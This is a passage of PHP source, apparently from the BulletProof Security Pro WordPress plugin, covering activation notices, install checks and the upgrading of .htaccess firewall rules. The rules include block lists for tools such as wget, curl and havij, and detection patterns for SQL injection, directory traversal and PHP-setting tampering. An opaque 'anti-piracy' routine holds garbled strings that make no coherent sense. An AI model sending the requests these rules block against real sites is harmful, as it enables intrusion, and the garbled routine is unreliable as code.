<?php
#  ________         ____________      _____ ________                       ________      
#  ___  __ )____  _____  /___  /_____ __  /____  __ \______________ ______ ___  __/      
#  __  __  |_  / / /__  / __  / _  _ \_  __/__  /_/ /__  ___/_  __ \_  __ \__  /_        
#  _  /_/ / / /_/ / _  /  _  /  /  __// /_  _  ____/ _  /    / /_/ // /_/ /_  __/        
#  /_____/  \__,_/  /_/   /_/   \___/ \__/  /_/      /_/     \____/ \____/ /_/           
#  ________                             _____ _____              ________                
#  __  ___/_____ ___________  _____________(_)__  /______  __    ___  __ \______________ 
#  _____ \ _  _ \_  ___/_  / / /__  ___/__  / _  __/__  / / /    __  /_/ /__  ___/_  __ \
#  ____/ / /  __// /__  / /_/ / _  /    _  /  / /_  _  /_/ /     _  ____/ _  /    / /_/ /
#  /____/  \___/ \___/  \__,_/  /_/     /_/   \__/  _\__, /      /_/      /_/     \____/ 
#                                                   /____/                               
# 42756C6C657450726F6F66 5365637572697479 50726F 
#
// Direct calls to this file are Forbidden when core files are not present 
if ( !function_exists ('add_action') ) {
		header('Status: 403 Forbidden');
		header('HTTP/1.1 403 Forbidden');
		exit();
}

/*	The Copyright, AITpro Software Products License Information and Credit Where Credit Is Due information below must remain
	intact or all BulletProof Security Pro warranties, guarantees, liabilities are void.
	
	Copyright (C) 2011-2015 Edward Alexander, AIT-pro.com. All rights reserved.

	AITpro Software Products License Information:
	BY DOWNLOADING, INSTALLING, COPYING, ACCESSING, OR USING BulletProof Security Pro YOU AGREE TO THE TERMS OF THIS AGREEMENT. 
	IF YOU 	ARE ACCEPTING THESE TERMS ON BEHALF OF ANOTHER PERSON OR A COMPANY OR OTHER LEGAL ENTITY, YOU REPRESENT AND WARRANT
	THAT YOU HAVE FULL AUTHORITY TO BIND THAT PERSON, COMPANY, OR LEGAL ENTITY TO THESE TERMS. IF YOU DO NOT AGREE TO THESE TERMS,
	* DO NOT DOWNLOAD, INSTALL, COPY, ACCESS, OR USE BulletProof Security Pro; AND
	* PROMPTLY RETURN BulletProof Security Pro TO THE PARTY FROM WHOM YOU ACQUIRED IT. IF YOU DOWNLOADED BulletProof Security Pro
	FROM THE AITPRO WEBSITE, CONTACT AITPRO FOR A REFUND IF APPLICABLE.
	
	AITpro Software Products License Information continued:
	You agree to keep the AITpro Software Products License for BulletProof Security Pro, unmodified or altered in any way,
	with the original copy of BulletProof Security Pro that you have and any and all copies or partial copies of BulletProof
	Security Pro that You make. 

	Credit Where Credit Is Due:
	Bonus Code:
	The following bonus code scripts, snippets or example code do not make up the core coding of BulletProof Security Pro 
	and are not included in the price of BulletProof Security Pro as they are free code scripts, snippets or example code 
	and are added as Bonus Code features to BulletProof Security Pro. Bonus Code has been adapted, modified and recoded 
	to work for WordPress and BPS Pro where necessary.

	DB String Finder code - AnyWhereInDB - author Nafis Ahmad
	DB Table Cleaner/Remover code - Copyright (c) 2009 Lester "GaMerZ" Chan
*/

// BPS Pro Software Anti-Piracy Check
// WARNING! Tampering with this code will cause BPS Pro to stop functioning.
// This code only does 1 thing - It checks that your copy of BPS Pro is not pirated and is legitimately licensed.
function bpsPro_AP_Check($D8) {
	if ( is_admin() && current_user_can('manage_options') && wp_script_is( 'bps-accordion', $list = 'queue' ) ) {
		$D1 = '51';
		$D2 = '55';
		$D3 = "ê0Wæ+êê‡p0‡`";
		$D4 = "¿‡ÄÄ∞@P∞P0–``pÄ¿";
		$D7 = "?±A‹¿pêÄ{ê0Wæ+êê‡p0‡`}p@‡¿‡ê∞|ªÄê{@Ä¿‡P0`pP‡‡`}xèVÈaﬁQQ∞{ÙE™}¨»‡0p`p–{ê@‡‡¿`Äp‡}P–0¿ê–@P{ÙΩwZ¨&:«¯!\"π{»∆¨A.Œ!¬`{–¿¿@r\"^Æf¿‡ÄÄ∞@P∞P0–``pÄ¿‡∞∞@ Ä∞}—v/èˇf∑A {ˆÚ∞x±ÁÏt™‘L¶>4}{:KtÈ»Í#∫J{L38÷$∞`Pp‡`Ä`y·∞∆s≥›r\"5∞‡ê‹\"ÊÎ‡W9¿±˝πkL84∫}[Ê≠¯X±∞bÃB*{”w¡∆„@–∞pêP`@p¿∞P@Ä0∆⁄D◊ƒ-ŒÂæ+Y =°p¿p}}";	
		for ($i=0;$i<$D7;$i++){ 		
			if ((ord($D7[$i]) >= $D2[$i])) {
				@$D8 = chr((ord($D2[$i])-ord($D1[$i]))%256);
			}
		}
	}
}

// First Launch Admin Notice / BPS Pro Activation & Setup Wizard Notification
function bps_first_launch_admin_notice_act() {

	if ( is_admin() && current_user_can('manage_options') ) {
	
	global $blog_id;
	if ( is_multisite() && $blog_id != 1 ) {	
		return;
	}

	$options = get_option('bulletproof_security_options_activation');

	if ( !get_option('bulletproof_security_options_activation') || strlen($options['bps_pro_activation']) == 17) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('BPS Pro Activation Notification', 'bulletproof-security').'<br>'.__('Please Activate BPS Pro first before doing anything else. BPS Pro will not function correctly until Activation has been completed. ', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/activation/activation.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the Activation page.', 'bulletproof-security').'</div>';
		echo $text;
	
	} else {

	if ( strlen($options['delete_paypal_email']) < 18 && strlen($options['bps_pro_activation']) != 17) {
		
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Activation Error', 'bulletproof-security').'</font><br>'.__('The BPS Pro plugin pages will display blank until Activation has been completed successfully.', 'bulletproof-security').'<br>'.__('Did you accidentally enter your Download Key in the Activation Key text box by mistake?', 'bulletproof-security').'<br>'.__('Please follow the 3 step Activation process on the BPS Pro Activation page. The Activation steps are numbered to match the text boxes.', 'bulletproof-security').'<br>'.__('Click the Read Me help button on the Activation page for additional troubleshooting help information.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/activation/activation.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the Activation page.', 'bulletproof-security').'</div>';
		echo $text;		
	}
	}
	
	if ( strlen($options['delete_paypal_email']) > 18) {
	
		$PreInstallOptions = get_option('bulletproof_security_options_preinstallation'); 
		$Smonitor_options = get_option('bulletproof_security_options_monitor');
		$Upgrade_notice_options = get_option('bulletproof_security_options_upgrade_notice'); 
		
		if ( $PreInstallOptions['bps_wizard_preinstallation'] != 'yes' && !$Smonitor_options['bps_first_launch'] ) {
			$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('BPS Pro Setup Wizard Notification', 'bulletproof-security').'<br>'.__('BPS Pro has been Activated successfully. ', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/wizard/wizard.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the BPS Pro Setup Wizard page.', 'bulletproof-security').'<br>'.__('Click the Run Pre-Installation Wizard Checks button first and then click the Run Setup Wizard button.', 'bulletproof-security').'</div>';
			echo $text;
		}
	
		if ( $PreInstallOptions['bps_wizard_preinstallation'] != 'yes' && $Smonitor_options['bps_first_launch'] && $Upgrade_notice_options['bps_upgrade_notification_wizard'] != 'yes') {
			$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;">'.__('New BPS Pro Setup Wizard Notification', 'bulletproof-security').'<br>'.__('BPS Pro setup can now be done in less than 1 minute with only 2 clicks using the new BPS Pro Setup Wizard.', 'bulletproof-security').'<br><a href="admin.php?page=bulletproof-security/admin/whatsnew/whatsnew.php">'.__('Click Here', 'bulletproof-security').'</a>'.__(' to go to the BPS Pro Whats New page to read more about the new BPS Pro Setup Wizard.', 'bulletproof-security').'</div>';
			echo $text;

			$bps_option_upgrade_notice = 'bulletproof_security_options_upgrade_notice';
			$bps_new_value_upgrade_wizard = 'yes';
			$BPS_Options_upgrade_notice = array( 'bps_upgrade_notification_wizard' => $bps_new_value_upgrade_wizard );

			if ( !get_option( $bps_option_upgrade_notice ) ) {	
				foreach( $BPS_Options_upgrade_notice as $key => $value ) {			
					update_option('bulletproof_security_options_upgrade_notice', $BPS_Options_upgrade_notice);
				}
		
			} else {
				foreach( $BPS_Options_upgrade_notice as $key => $value ) {			
					update_option('bulletproof_security_options_upgrade_notice', $BPS_Options_upgrade_notice);
				}
			}	
		}	
	} // end if ( strlen($options['delete_paypal_email']) > 18) { = A BPS Pro Activation Key has been entered
	}
}
add_action('admin_notices', 'bps_first_launch_admin_notice_act');

/***************************************/
// Installation/Upgrade Time Checks
/***************************************/

// Get the Current / Last Modifed Date of the bulletproof-security.php File - Minutes check
// used in both the php error log check and autorestore log check - touch minus 1 hour comes into play
function getBPSInstallTime() {
$filename = WP_PLUGIN_DIR . '/bulletproof-security/bulletproof-security.php';

	if ( file_exists($filename) ) {
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$last_modified_install = date("F d Y H:i", filemtime($filename) + $gmt_offset );
	return $last_modified_install;
	}
}

// Get the Current / Last Modifed Date of the readme.txt File - Minutes check
// used for checking and displaying .htaccess AutoUpdate notice
function getBPSInstallTimeTXT() {
$filename = WP_PLUGIN_DIR . '/bulletproof-security/readme.txt';

	if ( file_exists($filename) ) {
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$last_modified_install = date("F d Y H:i", filemtime($filename) + $gmt_offset );
	return $last_modified_install;
	}
}

// Get the Current / Last Modifed Date of the readme.txt File + one minute buffer - Minutes check
function getBPSInstallTime_plusone() {
$filename = WP_PLUGIN_DIR . '/bulletproof-security/readme.txt';

	if ( file_exists($filename) ) {
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$last_modified_install = date("F d Y H:i", filemtime($filename) + $gmt_offset + (60 * 1));
	return $last_modified_install;
	}
}

// Get the Current / Last Modifed Date of the Root .htaccess File - Minutes check
function getBPSRootHtaccessLasModTime_minutes() {
$filename = ABSPATH . '.htaccess';

	if ( file_exists($filename) ) {
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$last_modified_install = date("F d Y H:i", filemtime($filename) + $gmt_offset );
	return $last_modified_install;
	}
}

// Get the Current / Last Modifed Date of the wp-admin .htaccess File - Minutes check
function getBPSwpadminHtaccessLasModTime_minutes() {
$filename = ABSPATH . 'wp-admin/.htaccess';

	if ( file_exists($filename) ) {
		$gmt_offset = get_option( 'gmt_offset' ) * 3600;
		$last_modified_install = date("F d Y H:i", filemtime($filename) + $gmt_offset );
	return $last_modified_install;
	}
}

// Recreate the User Agent filters in the 403.php file on BPS upgrade
function bpsPro_autoupdate_useragent_filters() {		
global $wpdb;

	$bps403File = WP_PLUGIN_DIR . '/bulletproof-security/403.php';	

	if ( !file_exists($bps403File) ) {
		return;
	}
	
	$blankFile = WP_PLUGIN_DIR . '/bulletproof-security/admin/htaccess/blank.txt';
	$userAgentMaster = WP_CONTENT_DIR . '/bps-backup/master-backups/UserAgentMaster.txt';	

	if ( file_exists($blankFile) ) {
		copy($blankFile, $userAgentMaster);
	}

	$table_name = $wpdb->prefix . "bpspro_seclog_ignore";
	$bps403FileARQ = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/plugins/bulletproof-security/403.php';
	$ARQdir = WP_CONTENT_DIR . '/bps-backup/autorestore/wp-content/plugins/bulletproof-security/';
	$search = '';	

	$getSecLogTable = $wpdb->get_results( $wpdb->prepare("SELECT * FROM $table_name WHERE user_agent_bot LIKE %s", "%$search%") );
	$UserAgentRules = array();
		
	if ( $wpdb->num_rows != 0 ) {

		foreach ( $getSecLogTable as $row ) {
			$UserAgentRules[] = "(.*)".$row->user_agent_bot."(.*)|";
			file_put_contents($userAgentMaster, $UserAgentRules);
		}
	
	$UserAgentRulesT = file_get_contents($userAgentMaster);
	$stringReplace = file_get_contents($bps403File);

	$stringReplace = preg_replace('/# BEGIN USERAGENT FILTER(.*)# END USERAGENT FILTER/s', "# BEGIN USERAGENT FILTER\nif ( !preg_match('/".trim($UserAgentRulesT, "|")."/', \$_SERVER['HTTP_USER_AGENT']) ) {\n# END USERAGENT FILTER", $stringReplace);
		
	file_put_contents($bps403File, $stringReplace);
		
	if ( is_dir($ARQdir) ) {
		copy($bps403File, $bps403FileARQ);
	}
	}
}

// S-Monitor Display - Root htaccess - BPS Status and Alerts in WP Dashboard - wpOn
// IMPORTANT Note: preg_match must be enclosed otherwise the conditions fail
// also a nice bonus is that this forces the string replace on a new line.
// The Default BPS Processing Spinner is a lightweight CSS Spinner - no js
// The Alternate BPS Processing Spinner uses CSS and javascript
function bps_status_WP_Dashboard() {

	$options = get_option('bulletproof_security_options_monitor');	
	
	if ( current_user_can('manage_options') && $options['bps_security_status'] == 'wpOn' ) {
	
	global $bpspro_version, $bpspro_last_version, $wp_version, $wpdb, $aitpro_bullet, $pagenow;

	// Only performs these checks if a Form is submitted
	if ( esc_html($_SERVER['REQUEST_METHOD']) == 'POST' ) {

		if ( esc_html($_SERVER['QUERY_STRING']) == '' ) {
			$bps_base = basename(esc_html($_SERVER['REQUEST_URI']));
		} else {
			$bps_base = str_replace( admin_url(), '', esc_html($_SERVER['REQUEST_URI']) );
		}		
		
		echo '<div id="bps-status-display" style="float:left;margin:6px 0px 4px 8px;padding:3px 5px 3px 5px;background-color:#e8e8e8;border:1px solid gray;"><a href="'.$bps_base.'" style="text-decoration:none;font-weight:bold;">'.__('Reload BPS Pro Status Display', 'bulletproof-security').'</a></div>';
		echo '<div style="clear:both;"></div>';
		
		if ( @$_POST['submit-bps-spinner'] == true || @$_POST['Submit-Setup-Wizard-Preinstallation'] == true || @$_POST['Submit-Setup-Wizard'] == true || @$_POST['Submit-DBB-Run-Job'] == true || @$_POST['Submit-DB-Table-Prefix'] == true || @$_POST['Submit-DB-Prefix-Table-Refresh'] == true || @$_POST['Submit-ARCM-RootNR'] == true || @$_POST['Submit-ARCM-Wpadmin'] == true || @$_POST['Submit-ARCM-Wpincludes'] == true || @$_POST['Submit-ARCM-Wpcontent'] == true || @$_POST['Submit-ARCM-Root-Delete'] == true || @$_POST['Submit-ARCM-Wpadmin-Delete'] == true || @$_POST['Submit-ARCM-Wpincludes-Delete'] == true || @$_POST['Submit-ARCM-Wpcontent-Delete'] == true || @$_POST['Submit-ARCM-Root-Restore'] == true || @$_POST['Submit-ARCM-Wpadmin-Restore'] == true || @$_POST['Submit-ARCM-Wpincludes-Restore'] == true || @$_POST['Submit-ARCM-Wpcontent-Restore'] == true || @$_POST['Submit-ARCM-Root-Show-Backup'] == true || @$_POST['Submit-ARCM-Wpadmin-Show-Backup'] == true || @$_POST['Submit-ARCM-Wpincludes-Show-Backup'] == true || @$_POST['Submit-ARCM-Wpcontent-Show-Backup'] == true || @$_POST['Submit-ARCM-Root-Show-Website'] == true || @$_POST['Submit-ARCM-Wpadmin-Show-Website'] == true || @$_POST['Submit-ARCM-Wpincludes-Show-Website'] == true || @$_POST['Submit-ARCM-Wpcontent-Show-Website'] == true || @$_POST['Submit-Quarantine-Search-Radio'] == true || @$_POST['Submit-ARQ-Quarantine-Radio'] == true || @$_POST['submit-bps-zip-install'] == true || @$_POST['Submit-DBD-Diff-Tool'] == true || @$_POST['Submit-DBD-Diff-Large'] == true || @$_POST['Submit-diagnostic-check1'] == true || @$_POST['Submit-diagnostic-check2'] == true || @$_POST['bpsStringFinder'] == true || @$_POST['bpsStringReplacer'] == true || @$_POST['bpsStringReplacerFP'] == true || @$_POST['bpsDBStringFinder9'] == true || @$_POST['bpsMulti-Scan-All-Pages-Submit'] == true || @$_POST['bpsMulti-Scan-Plugins-Submit'] == true || @$_POST['bpsMulti-Scan-Submit'] == true ) {  

			$bpsPro_Spinner = get_option('bulletproof_security_options_spinner');	
	
		if ( $bpsPro_Spinner['bps_spinner'] != 'Off' ) {

			echo '<div id="bps-status-display" style="padding:2px 0px 4px 8px;width:240px;">';
			echo '<div id="bps-spinner" class="bps-spinner" style="background:#fff;border:4px solid black;">';
   			echo '<img id="bps-img-spinner" src="'.plugins_url('/bulletproof-security/admin/images/bps-spinner.gif').'" style="float:left;margin:0px 20px 0px 0px;" />'; 
			echo '<div id="bps-spinner-text-btn" style="padding:20px 0px 26px 0px;font-size:14px;">Processing...<br><button style="margin:10px 0px 0px 10px;" onclick="javascript:history.go(-1)">Cancel</button></div>';
			echo '</div>';
?>
    
<style>
<!--
.bps-spinner {
    visibility:visible;
	position:fixed;
    top:7%;
    left:45%;
 	width:240px;
	padding:2px 0px 4px 8px;   
	z-index:99999;
}
-->
</style>

	<?php
		echo '</div>';
		}  
		}
	
	} elseif ( esc_html($_SERVER['QUERY_STRING']) == 'page=bulletproof-security/admin/system-info/system-info.php' ) {
		echo '<div id="bps-status-display" style="float:left;padding:5px;">'.__('The BPS Pro Status Display is set to Off by default on the System Info page', 'bulletproof-security').'</div>';
		echo '<div style="clear:both;"></div>';
	} elseif ( $pagenow == 'about.php' || $pagenow == 'upload.php' ) {
		
		return;
	
	} else {
	
	$options2 = get_option('bulletproof_security_options_autolock');
	$Flockoptions = get_option('bulletproof_security_options_flock');
	
	$filename = ABSPATH . '.htaccess';
	$permsRootHtaccess = @substr(sprintf('%o', fileperms($filename)), -4);
	$sapi_type = php_sapi_name();	
	$check_string = @file_get_contents($filename);
	$section = @file_get_contents($filename, NULL, NULL, 3, 46);	
	$htaccessARRoot = WP_CONTENT_DIR . '/bps-backup/autorestore/root-files/auto_.htaccess';
	$bps_get_domain_root = bpsGetDomainRoot();
	$bps_get_wp_root_secure = bps_wp_get_root_folder();
	$bps_plugin_dir = str_replace( ABSPATH, '', WP_PLUGIN_DIR );
	$bps_root_upgrade = '';

	$patterna = '/RedirectMatch\s403\s\/\\\.\.\*\$/';
	$pattern0 = '/ErrorDocument\s400\s(.*)400\.php\s*ErrorDocument\s401\sdefault\s*ErrorDocument(.*)\s*ErrorDocument\s404\s\/404\.php/s';	
	$pattern1 = '/#\sFORBID\sEMPTY\sREFFERER\sSPAMBOTS(.*)RewriteCond\s%{HTTP_USER_AGENT}\s\^\$\sRewriteRule\s\.\*\s\-\s\[F\]/s';		
	// Only match 2 or more identical duplicate referer lines: 1 will not match and 2, 3, 4... will match
	$pattern2 = '/AnotherWebsite\.com\)\.\*\s*(RewriteCond\s%\{HTTP_REFERER\}\s\^\.\*'.$bps_get_domain_root.'\.\*\s*){2,}\s*RewriteRule\s\.\s\-\s\[S=1\]/s';
	$pattern4 = '/\.\*\(allow_url_include\|allow_url_fopen\|safe_mode\|disable_functions\|auto_prepend_file\) \[NC,OR\]/s';
	$pattern6 = '/(\[|\]|\(|\)|<|>|%3c|%3e|%5b|%5d)/s';
	$pattern7 = '/RewriteCond %{QUERY_STRING} \^\.\*(.*)[3](.*)[5](.*)[5](.*)[7](.*)\)/';
	$pattern8 = '/\[NC\]\s*RewriteCond\s%{HTTP_REFERER}\s\^\.\*(.*)\.\*\s*(.*)\s*(.*)\s*(.*)\s*(.*)\s*(.*)\s*RewriteRule\s\.\s\-\s\[S=1\]/';	
	$pattern9 = '/RewriteCond\s%{QUERY_STRING}\s\(sp_executesql\)\s\[NC\]\s*(.*)\s*(.*)END\sBPSQSE(.*)\s*RewriteCond\s%{REQUEST_FILENAME}\s!-f\s*RewriteCond\s%{REQUEST_FILENAME}\s!-d\s*RewriteRule\s\.(.*)\/index\.php\s\[L\]\s*(.*)LOOP\sEND/';
	$pattern10 = '/#\sBEGIN\sBPSQSE\sBPS\sQUERY\sSTRING\sEXPLOITS\s*#\sThe\slibwww-perl\sUser\sAgent\sis\sforbidden/';
	$pattern10a = '/RewriteCond\s%\{THE_REQUEST\}\s(.*)\?(.*)\sHTTP\/\s\[NC,OR\]\s*RewriteCond\s%\{THE_REQUEST\}\s(.*)\*(.*)\sHTTP\/\s\[NC,OR\]/';		
	$pattern10b = '/RewriteCond\s%\{THE_REQUEST\}\s.*\?\+\(%20\{1,\}.*\s*RewriteCond\s%\{THE_REQUEST\}\s.*\+\(.*\*\|%2a.*\s\[NC,OR\]/';	
	$pattern10c = '/RewriteCond\s%\{THE_REQUEST\}\s\(\\\\?.*%2a\)\+\(%20\+\|\\\\s\+.*HTTP\(:\/.*\[NC,OR\]/';
	$pattern11 = '/RewriteCond\s%\{QUERY_STRING\}\s\[a-zA-Z0-9_\]\=http:\/\/\s\[OR\]/';
	$pattern12 = '/RewriteCond\s%\{QUERY_STRING\}\s\[a-zA-Z0-9_\]\=\(\\\.\\\.\/\/\?\)\+\s\[OR\]/';
	$pattern13 = '/RewriteCond\s%\{QUERY_STRING\}\s\(\\\.\\\.\/\|\\\.\\\.\)\s\[OR\]/';
	$pattern14 = '/RewriteCond\s%{QUERY_STRING}\s\(\\\.\/\|\\\.\.\/\|\\\.\.\.\/\)\+\(motd\|etc\|bin\)\s\[NC,OR\]/';

	if ( !file_exists($filename) ) {
		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! An htaccess file was NOT found in your root folder. Check the BPS Pro ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php#bps-tabs-2">'.__('Security Status page', 'bulletproof-security').'</a>'.__(' for more specific information.', 'bulletproof-security').'</font></div>';
		echo $text;
	
	} else {
	
	if ( file_exists($filename) ) {

switch ( $bpspro_version ) {
    case $bpspro_last_version:
		if ( strpos( $check_string, "BULLETPROOF PRO $bpspro_last_version" ) && strpos( $check_string, "BPSQSE" ) ) {
			print($section);
		}
		break;
    case ! strpos( $check_string, "BULLETPROOF" ) && ! strpos( $check_string, "DEFAULT" ):

		$text = '<div class="update-nag" style="background-color:#ffffe0;font-size:1em;font-weight:bold;padding:2px 5px;margin-top:2px;"><font color="red">'.__('BPS Pro Alert! Your site may not be protected by BulletProof Security', 'bulletproof-security').'</font><br>'.__('The BPS version: BULLETPROOF PRO x.x SECURE .HTACCESS line of code was not found at the top of your Root htaccess file.', 'bulletproof-security').'<br>'.__('The BPS version line of code MUST be at the very top of your Root htaccess file.', 'bulletproof-security').'<br>'.__('Go to the ', 'bulletproof-security').'<a href="admin.php?page=bulletproof-security/admin/core/options.php">'.__('Security Modes page', 'bulletproof-security').'</a>'.__(' and click the Create secure.htaccess File AutoMagic button and Activate Root Folder BulletProof Mode.', 'bulletproof-security').'</div>';
		echo $text;

		break;
	case ! strpos( $check_string, "BULLETPROOF PRO $bpspro_version" ) && strpos( $check_string, "BPSQSE" ):
		
			// delete the old Maintenance Mode DB option - leave this here for 3 versions. Added in BPS Pro 8.2
			if ( get_option('bulletproof_security_options_maint') ) {	
				delete_option('bulletproof_security_options_maint');
			}
			
			if ( @substr( $sapi_type, 0, 6 ) != 'apache' || @$permsRootHtaccess != '0666' || @$permsRootHtaccess != '0777' ) { // Windows IIS, XAMPP, etc
				@chmod($filename, 0644);
			}
			
			$stringReplace = @file_get_contents($filename);
			$stringReplace = preg_replace('/BULLETPROOF PRO(.*)SECURE .HTACCESS/s', "BULLETPROOF PRO $bpspro_version SECURE .HTACCESS", $stringReplace);
			
			$stringReplace = str_replace("RewriteCond %{HTTP_USER_AGENT} (libwww-perl|wget|python|nikto|curl|scan|java|winhttp|clshttp|loader) [NC,OR]", "RewriteCond %{HTTP_USER_AGENT} (havij|libwww-perl|wget|python|nikto|curl|scan|java|winhttp|clshttp|loader) [NC,OR]", $stringReplace);
		
		if ( preg_match( $patterna, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/#\sDENY\sACCESS\sTO\sPROTECTED\sSERVER\sFILES(.*)RedirectMatch\s403\s\/\\\.\.\*\$/s', "# DENY ACCESS TO PROTECTED SERVER FILES AND FOLDERS\n# Files and folders starting with a dot: .htaccess, .htpasswd, .errordocs, .logs\nRedirectMatch 403 \.(htaccess|htpasswd|errordocs|logs)$", $stringReplace);
		}	

		if ( !preg_match( $pattern0, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/ErrorDocument\s400\s(.*)400\.php\s*ErrorDocument(.*)\s*ErrorDocument\s404\s\/404\.php/s', "ErrorDocument 400 $bps_get_wp_root_secure"."$bps_plugin_dir/bulletproof-security/400.php\nErrorDocument 401 default\nErrorDocument 403 $bps_get_wp_root_secure"."$bps_plugin_dir/bulletproof-security/403.php\nErrorDocument 404 $bps_get_wp_root_secure"."404.php", $stringReplace);
		}
		
		if ( preg_match( $pattern1, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/#\sFORBID\sEMPTY\sREFFERER\sSPAMBOTS(.*)RewriteCond\s%{HTTP_USER_AGENT}\s\^\$\sRewriteRule\s\.\*\s\-\s\[F\]/s', "", $stringReplace);
		}				
		
		if ( preg_match($pattern2, $stringReplace, $matches) ) {
			$stringReplace = preg_replace('/AnotherWebsite\.com\)\.\*\s*(RewriteCond\s%\{HTTP_REFERER\}\s\^\.\*'.$bps_get_domain_root.'\.\*\s*){2,}\s*RewriteRule\s\.\s\-\s\[S=1\]/s', "AnotherWebsite.com).*\nRewriteCond %{HTTP_REFERER} ^.*$bps_get_domain_root.*\nRewriteRule . - [S=1]", $stringReplace);
		}		
		
		if ( !preg_match( $pattern10, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/#\sBPSQSE\sBPS\sQUERY\sSTRING\sEXPLOITS\s*#\sThe\slibwww-perl\sUser\sAgent\sis\sforbidden/', "# BEGIN BPSQSE BPS QUERY STRING EXPLOITS\n# The libwww-perl User Agent is forbidden", $stringReplace);
		}
		
		if ( preg_match( $pattern10a, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10a, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern10b, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10b, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern10c, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace( $pattern10c, "RewriteCond %{THE_REQUEST} (\?|\*|%2a)+(%20+|\\\\\s+|%20+\\\\\s+|\\\\\s+%20+|\\\\\s+%20+\\\\\s+)HTTP(:/|/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern11, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/RewriteCond\s%\{QUERY_STRING\}\s\[a-zA-Z0-9_\]\=http:\/\/\s\[OR\]/s', "RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=http:// [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern12, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/RewriteCond\s%\{QUERY_STRING\}\s\[a-zA-Z0-9_\]\=\(\\\.\\\.\/\/\?\)\+\s\[OR\]/s', "RewriteCond %{QUERY_STRING} [a-zA-Z0-9_]=(\.\.//?)+ [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern13, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/RewriteCond\s%\{QUERY_STRING\}\s\(\\\.\\\.\/\|\\\.\\\.\)\s\[OR\]/s', "RewriteCond %{QUERY_STRING} (\.\./|%2e%2e%2f|%2e%2e/|\.\.%2f|%2e\.%2f|%2e\./|\.%2e%2f|\.%2e/) [NC,OR]", $stringReplace);
		}

		if ( preg_match( $pattern6, $stringReplace, $matches ) ) {
			$stringReplace = str_replace("RewriteCond %{QUERY_STRING} ^.*(\[|\]|\(|\)|<|>|%3c|%3e|%5b|%5d).* [NC,OR]", "RewriteCond %{QUERY_STRING} ^.*(\(|\)|<|>|%3c|%3e).* [NC,OR]", $stringReplace);
		}
		
		if ( preg_match( $pattern7, $stringReplace, $matches ) ) {
$stringReplace = preg_replace('/RewriteCond %{QUERY_STRING} \^\.\*(.*)[5](.*)[5](.*)\)/', 'RewriteCond %{QUERY_STRING} ^.*(\x00|\x04|\x08|\x0d|\x1b|\x20|\x3c|\x3e|\x7f)', $stringReplace);
		}

		if ( preg_match( $pattern14, $stringReplace, $matches ) ) {
			$stringReplace = preg_replace('/RewriteCond\s%{QUERY_STRING}\s\(\\\.\/\|\\\.\.\/\|\\\.\.\.\/\)\+\(motd\|etc\|bin\)\s\[NC,OR\]/s', "RewriteCond %{QUERY_STRING} (\.{1,}/)+(motd|etc|bin) [NC,OR]", $stringReplace);
		}

		if ( !preg_match( $pattern4, $stringReplace, $matches ) ) {
			$stringReplace = str_replace("RewriteCond %{QUERY_STRING} union([^a]*a)+ll([^s]*s)+elect [NC,OR]", "RewriteCond %{QUERY_STRING} union([^a]*a)+ll([^s]*s)+elect [NC,OR]\nRewriteCond %{QUERY_STRING} \-[sdcr].*(allow_url_include|allow_url_fopen|safe_mode|disable_functions|auto_prepend_file) [NC,OR]", $stringReplace);
		}

		if ( !is_multisite() && !preg_match( $pattern9, $stringReplace, $matches ) ) {
